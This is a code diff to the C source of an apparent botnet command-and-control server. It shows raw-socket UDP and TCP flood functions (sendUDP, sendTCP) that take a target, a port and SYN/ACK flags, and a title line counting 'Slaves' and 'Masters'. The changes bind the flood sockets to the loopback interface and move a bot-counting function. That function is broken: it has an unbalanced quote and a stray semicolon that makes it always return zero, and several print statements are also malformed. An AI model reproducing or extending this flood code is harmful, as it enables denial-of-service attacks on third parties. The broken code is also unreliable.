@@ -14,6 +14,17 @@
 #include <pthread.h>
 #include <signal.h>
 #include <arpa/inet.h>
+#include <strings.h>
+#include <sys/utsname.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+
 #define MAXFDS 1000000
 //////////////////////////////////
 struct login_info {
@@ -58,6 +69,24 @@ unsigned short csum (unsigned short *buf, int count)
         if(count > 0) { sum += *(unsigned char *)buf; }
         while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
         return (uint16_t)(~sum);
+}
+int botcountlines()
+{                                    
+  FILE *fp = fopen("ips.txt,"r");
+  int ch=0;
+  int lines=0;
+
+  if (fp == NULL);
+  return 0;
+
+  lines++;
+  while ((ch = fgetc(fp)) != EOF)
+    {
+      if (ch == '\n')
+    lines++;
+    }
+  fclose(fp);
+  return lines;
 }
 int listFork()
 {
@@ -123,6 +152,7 @@ void makeRandomStr(unsigned char *buf, int length)
 void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval)
 {
         struct sockaddr_in dest_addr;
+        struct ifreq ifr;
 
         dest_addr.sin_family = AF_INET;
         if(port == 0) dest_addr.sin_port = rand_cmwc();
@@ -175,7 +205,11 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                         printf("Failed setting raw headers mode.");
                         return;
                 }
-
+                memset(&ifr, 0, sizeof(ifr));
+                snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
+                if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
+                       printf("Error binding to interface.");
+                }
                 int counter = 50;
                 while(counter--)
                 {
@@ -221,6 +255,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
 void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int pollinterval)
 {
         struct sockaddr_in dest_addr;
+        struct ifreq ifr;
 
         dest_addr.sin_family = AF_INET;
         if(port == 0) dest_addr.sin_port = rand_cmwc();
@@ -273,7 +308,11 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
                 printf("Failed setting raw headers mode.");
                 return;
         }
-
+        memset(&ifr, 0, sizeof(ifr));
+        snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
+        if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
+               printf("Error binding to interface.");
+        }
         unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
         struct iphdr *iph = (struct iphdr *)packet;
         struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
@@ -567,7 +606,7 @@ void *TitleWriter(void *sock) {
     char string[2048];
     while(1) {
 		memset(string, 0, 2048);
-        sprintf(string, "%c]0;Slaves Connected: %d | Masters Connected: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007');
+        sprintf(string, "%c]0;Slaves Connected: %d | Masters Connected: %d%c", '\033', botcountlines(), OperatorsConnected, '\007');
         if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 		sleep(2);
 }}
@@ -591,24 +630,6 @@ int Find_Login(char *str) {
         fclose(fp);
     if(find_result == 0)return 0;
     return find_line;
-}
-int botcountlines()
-{                                    
-  FILE *fp = fopen("ips.txt,"r");
-  int ch=0;
-  int lines=0;
-
-  if (fp == NULL);
-  return 0;
-
-  lines++;
-  while ((ch = fgetc(fp)) != EOF)
-    {
-      if (ch == '\n')
-    lines++;
-    }
-  fclose(fp);
-  return lines;
 }
 void *BotWorker(int argc, char *argv[ ], void *sock) {
 	int datafd = (int)sock;
@@ -814,7 +835,7 @@ void *BotWorker(int argc, char *argv[ ], void *sock) {
                                                        printf(TCP <target> <port (0 for random)> <time> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                        return;
                                            }
-			                   unsigned char *ip = argv[1];
+			                   unsigned char *target = argv[1];
                                            int port = atoi(argv[2]);
                                            int time = atoi(argv[3]);
                                            unsigned char *flags = argv[4];
